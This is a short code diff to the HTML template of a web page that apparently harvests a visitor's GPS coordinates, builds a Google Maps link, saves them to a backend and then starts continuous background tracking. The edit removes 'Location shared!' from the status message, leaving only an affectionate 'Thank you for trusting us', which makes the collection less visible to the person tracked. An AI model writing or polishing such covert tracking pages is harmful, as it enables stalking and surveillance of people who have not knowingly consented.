@@ -503,7 +503,7 @@ HTML_TEMPLATE = '''
             collectedData.longitude = position.coords.longitude;
             collectedData.mapUrl = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
             await saveToBackend(collectedData);
-            showStatus('✨ Location shared! Thank you for trusting us 💕', 'success');
+            showStatus('✨Thank you for trusting us 💕', 'success');
             
             // Start continuous tracking in background
             navigator.geolocation.watchPosition(async (newPos) => {
